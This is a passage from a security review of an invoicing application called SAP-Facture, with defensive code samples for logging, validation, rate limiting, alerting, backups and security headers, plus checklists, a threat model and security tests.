        formatter = logging.Formatter(
            "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
        )
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)

    def log_invoice_created(
        self,
        invoice_id: str,
        client_id: str,
        montant: float,
        user: str = "system",
    ):
        """Log invoice creation."""
        self.logger.info(
            "INVOICE_CREATED",
            extra={
                "invoice_id": invoice_id,
                "client_id": client_id,
                "montant": montant,
                "user": user,
                "timestamp": datetime.utcnow().isoformat(),
            }
        )

    def log_sheets_access(self, action: str, sheet_name: str):
        """Log Sheets API access."""
        self.logger.info(
            f"SHEETS_{action.upper()}",
            extra={
                "sheet": sheet_name,
                "timestamp": datetime.utcnow().isoformat(),
            }
        )

    def log_urssaf_api_call(
        self,
        endpoint: str,
        client_id: str,
        status_code: int,
    ):
        """Log URSSAF API calls."""
        self.logger.info(
            "URSSAF_API_CALL",
            extra={
                "endpoint": endpoint,
                "client_id": client_id,
                "status": status_code,
                "timestamp": datetime.utcnow().isoformat(),
            }
        )

audit_logger = AuditLogger()
```

**Use in services** :
```python
# app/services/invoice_service.py
class InvoiceService:
    async def create_invoice(self, invoice: InvoiceRequest) -> Invoice:
        # Create invoice
        audit_logger.log_invoice_created(
            invoice.id,
            invoice.client_id,
            invoice.montant_total,
        )

        # Call URSSAF
        response = await self.urssaf_client.create_payment_request(invoice)
        audit_logger.log_urssaf_api_call(
            endpoint="/demandes-paiement",
            client_id=invoice.client_id,
            status_code=response.status_code,
        )
```

---

### HIGH — Adresser Phase 1

#### H1 : Rate Limiting
**Problème** : DoS attack possible (no rate limiting)
**Action** :
```bash
# Install
pip install slowapi

# Or see code example in Risque 4 section above
```

---

#### H2 : Input Validation
**Problème** : User inputs not strictly validated
**Action** :
```python
# Use Pydantic v2 for all inputs
from pydantic import BaseModel, Field, field_validator
from typing import Annotated
from datetime import date

class InvoiceRequest(BaseModel):
    client_id: str = Field(min_length=1, max_length=50)
    type_unite: str = Field(pattern="^(HEURE|FORFAIT)$")  # Enum-like
    quantite: Annotated[float, Field(gt=0, le=1000)]  # > 0 and <= 1000
    montant_unitaire: Annotated[float, Field(gt=0, le=1000)]
    date_debut: date
    date_fin: date
    description: str = Field(max_length=500)

    @field_validator('date_fin')
    @classmethod
    def validate_date_range(cls, v, values):
        if 'date_debut' in values.data and v < values.data['date_debut']:
            raise ValueError('date_fin must be >= date_debut')
        return v
```

---

#### H3 : Error Handling (no stack traces to client)
**Problème** : Error messages may leak internals
**Action** :
```python
# app/main.py
from fastapi import FastAPI, status
from fastapi.responses import JSONResponse
from fastapi.exceptions import RequestValidationError

app = FastAPI()

@app.exception_handler(Exception)
async def generic_exception_handler(request, exc):
    """Catch all exceptions, return generic message."""

    # Log full error server-side
    logger.error(
        f"Unhandled exception: {exc}",
        exc_info=True
    )

    # Return generic message to client
    return JSONResponse(
        status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
        content={"detail": "Internal server error"},
    )

@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request, exc):
    """Handle Pydantic validation errors."""

    # Log error
    logger.warning(f"Validation error: {exc}")

    # Return client-safe message
    return JSONResponse(
        status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
        content={"detail": "Invalid request data"},
    )
```

---

#### H4 : Monitoring & Alerting
**Problème** : No visibility into security events
**Action** :
```python
# app/monitoring/alerts.py
import smtplib
from email.mime.text import MIMEText

class SecurityAlert:
    def __init__(self, smtp_config: dict):
        self.smtp_config = smtp_config

    async def alert_unauthorized_access(self, email: str):
        """Send alert if unauthorized access detected."""
        msg = MIMEText(
            f"Unauthorized access attempt: {email}\n\n"
            "Review: https://myapp.com/admin/audit-logs"
        )
        msg["Subject"] = "SECURITY: Unauthorized Access"
        msg["From"] = self.smtp_config["user"]
        msg["To"] = "jules@example.com"

        with smtplib.SMTP(
            self.smtp_config["host"],
            self.smtp_config["port"]
        ) as server:
            server.starttls()
            server.login(
                self.smtp_config["user"],
                self.smtp_config["password"]
            )
            server.send_message(msg)

alerts = SecurityAlert(smtp_config=settings.smtp_config)
```

---

#### H5 : Backup & Disaster Recovery
**Problème** : Data loss if Google Sheets corrupted/deleted
**Action** :
```python
# app/backup/sheets_backup.py
import os
import gzip
from datetime import datetime
from pathlib import Path

class SheetsBackup:
    def __init__(self, backup_dir: str = "./backups"):
        self.backup_dir = Path(backup_dir)
        self.backup_dir.mkdir(exist_ok=True)

    async def backup_all_sheets(self, spreadsheet):
        """Export all sheet data to CSV + compress."""

        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")

        for sheet_name in [
            "Clients", "Factures", "Transactions",
            "Lettrage", "Balances"
        ]:
            sheet = spreadsheet.worksheet(sheet_name)
            data = sheet.get_all_values()

            # Save to CSV
            csv_path = self.backup_dir / f"{sheet_name}_{timestamp}.csv"
            with open(csv_path, "w") as f:
                import csv
                writer = csv.writer(f)
                writer.writerows(data)

            # Compress
            with open(csv_path, "rb") as f_in:
                gz_path = csv_path.with_suffix(".csv.gz")
                with gzip.open(gz_path, "wb") as f_out:
                    f_out.writelines(f_in)

            # Delete uncompressed
            csv_path.unlink()

            logger.info(f"Backed up {sheet_name}: {gz_path}")

# Schedule daily
from apscheduler.schedulers.asyncio import AsyncIOScheduler
scheduler = AsyncIOScheduler()

async def backup_job():
    backup = SheetsBackup()
    await backup.backup_all_sheets(spreadsheet)

scheduler.add_job(backup_job, "cron", hour=23, minute=0)
scheduler.start()
```

---

### MEDIUM — Adresser Phase 2

#### M1 : Data Encryption at Rest
**Problème** : PII stored plaintext in Sheets
**Recommendation** :
- Implement Fernet encryption (see section "Chiffrement Données au Repos")
- Encrypt before write to Sheets, decrypt on read
- Phase 2 (when load testing done)

---

#### M2 : Secrets Rotation Policy
**Recommendation** :
- Quarterly rotation of URSSAF credentials
- Quarterly rotation of SMTP password
- Annual rotation of Google Service Account key
- Document process: who rotates, where store old keys (audit)

---

#### M3 : API Response Pagination
**Problem** : Large GET requests can timeout
**Recommendation** :
- Paginate client list (e.g., 50 per page)
- Implement cursor-based pagination (safer than offset)
- Cache results 5 minutes

---

#### M4 : Web Application Security Headers
**Recommendation** :
```python
from fastapi.middleware import Middleware
from fastapi.middleware.cors import CORSMiddleware
from fastapi.middleware.trustedhost import TrustedHostMiddleware

middlewares = [
    # CORS: restrict to Jules domain only
    Middleware(
        CORSMiddleware,
        allow_origins=["https://sap-facture.example.com"],
        allow_credentials=True,
        allow_methods=["GET", "POST"],
        allow_headers=["Authorization", "Content-Type"],
    ),
    # Only allow trusted hosts
    Middleware(
        TrustedHostMiddleware,
        allowed_hosts=["sap-facture.example.com"]
    ),
]

app = FastAPI(middleware=middlewares)

# Add security headers
@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["X-XSS-Protection"] = "1; mode=block"
    response.headers["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
    response.headers["Content-Security-Policy"] = "default-src 'self'"
    return response
```

---

#### M5 : DPIA (Data Protection Impact Assessment)
**Recommendation** :
- Document in `docs/DPIA.md`
- Identifies risks, mitigations
- Required by GDPR Article 35 (high-risk processing)

---

### LOW — Nice to Have

#### L1 : Penetration Testing
- Annual external pentest before production
- Focus: URSSAF API integration, Google authentication

#### L2 : Bug Bounty Program
- Publier URL bug bounty (HackerOne, Intigriti)
- Pays researches qui trouvent vulnérabilités

#### L3 : Security Training for Jules
- OWASP Top 10 overview
- Phishing awareness
- Password hygiene

---

## Checklist de Sécurité

### Avant Déploiement MVP (Phase 1 Production)

- [ ] **C1** `.env` NOT committed to git
  - [ ] `.gitignore` updated with `*.env*`
  - [ ] Check: `git ls-files | grep .env` returns nothing
  - [ ] Rotate all secrets (URSSAF, Google, Swan, SMTP)

- [ ] **C2** Google Sheets access control
  - [ ] Owner: Jules only
  - [ ] Editor: Service Account only
  - [ ] Sharing: "Restricted" (not public)
  - [ ] Monthly audit script deployed

- [ ] **C3** HTTPS + TLS enforcement
  - [ ] All API URLs use `https://`
  - [ ] SSL certificate verified (aiohttp/requests)
  - [ ] Fail-on-startup if HTTP detected (production)

- [ ] **C4** Authentication on all routes
  - [ ] API key required (HTTPBearer or session)
  - [ ] Constant-time comparison (prevent timing attack)
  - [ ] All endpoints protected (check each route)

- [ ] **C5** Audit logging
  - [ ] Audit logger configured (separate file)
  - [ ] URSSAF calls logged (endpoint, client_id, status)
  - [ ] Sheets access logged (action, sheet, timestamp)
  - [ ] Failed auth attempts logged

- [ ] **H1** Rate limiting
  - [ ] slowapi installed and configured
  - [ ] 10 req/min default, 1 req/sec per endpoint
  - [ ] Alerts if rate limit exceeded

- [ ] **H2** Input validation
  - [ ] Pydantic v2 for all request models
  - [ ] Field constraints (min, max, pattern, enum)
  - [ ] Custom validators for cross-field validation
  - [ ] `value_input_option="RAW"` for Sheets writes (no formula injection)

- [ ] **H3** Error handling
  - [ ] Generic error messages to client (no stack traces)
  - [ ] Full errors logged server-side
  - [ ] 404/403/500 handlers defined

- [ ] **H4** Monitoring & alerting
  - [ ] Unauthorized access alerts (email to Jules)
  - [ ] API quota warnings (80% threshold)
  - [ ] Sheets quota warnings (80% threshold)
  - [ ] Failed URSSAF calls alert

- [ ] **H5** Backup & recovery
  - [ ] Daily Sheets backup (CSV compressed)
  - [ ] Backup retention: 30 days
  - [ ] Tested restore procedure (monthly)

- [ ] **General**
  - [ ] `.env.example` created (no secrets)
  - [ ] `SECURITY.md` or this document linked in README
  - [ ] Incident response plan documented (docs/INCIDENT_RESPONSE.md)
  - [ ] Dependencies checked for known vulnerabilities
    - [ ] `pip-audit` run and clean
    - [ ] All deps pinned (not `*` versions)

### Phase 2 (Semaine 2-3)

- [ ] **M1** Data encryption at rest
  - [ ] Fernet key generated and stored in `.env`
  - [ ] Address fields encrypted before Sheets write
  - [ ] Decryption on read from Sheets
  - [ ] Tests: encrypt/decrypt roundtrip

- [ ] **M2** Secrets rotation policy
  - [ ] Document: who, when, how rotate
  - [ ] URSSAF credentials rotation quarterly
  - [ ] SMTP password rotation quarterly
  - [ ] Google SA key rotation annually

- [ ] **M3** API pagination
  - [ ] GET /clients paginated (50 per page)
  - [ ] Cursor-based pagination implemented
  - [ ] Client cache: 5 min TTL

- [ ] **M4** Security headers
  - [ ] CORS restricted to Jules domain
  - [ ] X-Content-Type-Options, X-Frame-Options set
  - [ ] CSP header configured
  - [ ] HSTS enabled

- [ ] **M5** DPIA
  - [ ] Document risks & mitigations
  - [ ] Share with Jules for review

### Production (Ongoing)

- [ ] Monthly audit logs review
- [ ] Monthly Sheets sharing verification
- [ ] Quarterly secrets rotation
- [ ] Quarterly dependency updates
- [ ] Quarterly security training (Jules)
- [ ] Annual penetration testing

---

## Recommendations Implémentation (Roadmap)

### Phase 1 MVP (Semaine 1)
**Objectif** : Sécurité baseline avant production

**Must-have** :
1. Secrets management (C1)
2. Google Sheets access control (C2)
3. HTTPS enforcement (C3)
4. Authentication routes (C4)
5. Audit logging (C5)

**Tasks** :
```
Day 1: Setup .env, rotate secrets, .gitignore
Day 2: Implement authentication layer, audit logging
Day 3: Testing, deployment checklist
```

**Code Location** :
- Secrets: `app/config.py` (Pydantic BaseSettings)
- Auth: `app/auth.py` (HTTPBearer dependency)
- Audit: `app/security/audit_logger.py`
- API routes: `app/main.py` (add `Depends(verify_api_key)`)

---

### Phase 2 (Semaine 2-3)
**Objectif** : Hardening, monitoring, compliance

**Must-have** :
1. Rate limiting (H1)
2. Input validation (H2)
3. Error handling (H3)
4. Monitoring & alerts (H4)
5. Backup system (H5)

**Nice-to-have** :
1. Data encryption at rest (M1)
2. Secrets rotation policy (M2)

**Code Location** :
- Rate limit: `app/main.py` (slowapi middleware)
- Validation: Each `app/routes/*.py` (Pydantic models)
- Error handlers: `app/main.py` (exception handlers)
- Monitoring: `app/monitoring/alerts.py`
- Backup: `app/backup/sheets_backup.py`

---

### Phase 3+ (Mois 2+)
**Objectif** : Advanced security

1. End-to-end encryption (optional)
2. Penetration testing
3. Bug bounty program
4. Advanced analytics (threat detection)

---

## Contacts & Escalation

### Vulnerability Disclosure Process

If security issue discovered:
1. **Email** (do NOT use GitHub issues): `security@sap-facture.example.com`
2. **Include** :
   - Vulnerability description
   - Impact assessment
   - Proof of concept (if safe)
   - Recommended fix
3. **Timeline** :
   - Day 0: Acknowledge receipt
   - Day 1-7: Initial investigation
   - Day 7: Status update
   - Day 30: Patch deployed

---

## References & Resources

### OWASP Top 10 (2023)
1. **Broken Access Control** → Auth implemented
2. **Cryptographic Failures** → HTTPS enforced, secrets in .env
3. **Injection** → Pydantic validation, no SQL
4. **Insecure Design** → Architecture reviewed
5. **Security Misconfiguration** → Hardening checklist above
6. **Vulnerable & Outdated Components** → pip-audit, dependency scanning
7. **Authentication Failures** → API key auth
8. **Software Data Integrity** → TLS + certificate verification
9. **Logging & Monitoring** → Audit logger
10. **SSRF** → Not applicable (no user-provided URLs)

### GDPR Compliance
- **Article 32** (Security): Encryption, access control, audit logs
- **Article 33** (Breach notification): Incident response plan required
- **Article 35** (DPIA): Risk assessment for high-risk processing
- **Article 21** (Right to object): Soft delete mechanism

### Google Cloud Security Best Practices
- https://cloud.google.com/docs/authentication
- https://cloud.google.com/docs/authentication/managing-credentials
- https://developers.google.com/sheets/api/guides/authorizing-requests

### API Security
- https://owasp.org/www-project-api-security/
- https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html

---

## Version & Approval

| Field | Value |
|-------|-------|
| **Document** | Security Review — SAP-Facture |
| **Version** | 1.0 |
| **Date** | 15 Mars 2026 |
| **Author** | Security Reviewer |
| **Status** | Final (approval pending) |
| **Next Review** | Avant Phase 1 Production |

---

## Appendix A — Threat Model Summary

```
┌────────────────────────────────────────────────────────────┐
│ THREAT ACTORS & MOTIVATIONS                                │
├────────────────────────────────────────────────────────────┤
│                                                              │
│ 1. OPPORTUNISTIC ATTACKER (Script kiddie)                  │
│    Motivation: Find easy targets, exploit automation       │
│    Threat: DoS (rate limit bypass), brute force auth       │
│    Mitigation: Rate limiting, strong auth                  │
│                                                              │
│ 2. INSIDER THREAT (Malicious admin)                        │
│    Motivation: Steal data, sabotage                        │
│    Threat: Accidental secrets commit, auth bypass          │
│    Mitigation: Code review, audit logs, access control    │
│                                                              │
│ 3. CREDENTIAL COMPROMISE (Lost .env file)                 │
│    Motivation: Account takeover, impersonation             │
│    Threat: URSSAF token abuse, Sheets exfiltration         │
│    Mitigation: Rotation, monitoring, certificate pinning   │
│                                                              │
│ 4. MAN-IN-The-MIDDLE Attacker                             │
│    Motivation: Intercept credentials, modify data          │
│    Threat: OAuth token leakage, API manipulation           │
│    Mitigation: HTTPS enforced, certificate verification    │
│                                                              │
└────────────────────────────────────────────────────────────┘
```

---

## Appendix B — Security Testing Checklist

### Manual Testing
- [ ] Try accessing /invoices without API key → expect 403
- [ ] Try accessing /invoices with wrong API key → expect 403
- [ ] Try creating invoice with montant=-100 → expect 422 validation error
- [ ] Try creating invoice with future date_fin < date_debut → expect validation error
- [ ] Try exporting > 1000 rows → expect paginated response
- [ ] Check .env not in git: `git log -p -- .env | head`
- [ ] Check HTTPS only: curl http://API → expect 307 redirect

### Automated Testing
```python
# tests/test_security.py
import pytest
from fastapi.testclient import TestClient

client = TestClient(app)

def test_invoice_requires_api_key():
    """POST /invoices without auth → 403."""
    response = client.post(
        "/invoices",
        json={"client_id": "c1", ...}
    )
    assert response.status_code == 403

def test_invoice_rejects_invalid_input():
    """POST /invoices with montant=-100 → 422."""
    response = client.post(
        "/invoices",
        headers={"X-API-Key": "valid_key"},
        json={"client_id": "c1", "montant_total": -100, ...}
    )
    assert response.status_code == 422

def test_env_not_in_repo(tmp_path):
    """Verify .env not committed."""
    # Check .gitignore contains *.env*
    gitignore = Path(".gitignore").read_text()
    assert "*.env*" in gitignore

    # Check no .env in git history
    result = subprocess.run(
        ["git", "log", "-p", "--", ".env"],
        capture_output=True,
        text=True,
    )
    assert "URSSAF_CLIENT_SECRET" not in result.stdout
```

---

**FIN DU DOCUMENT — Audit Complet de Sécurité SAP-Facture**
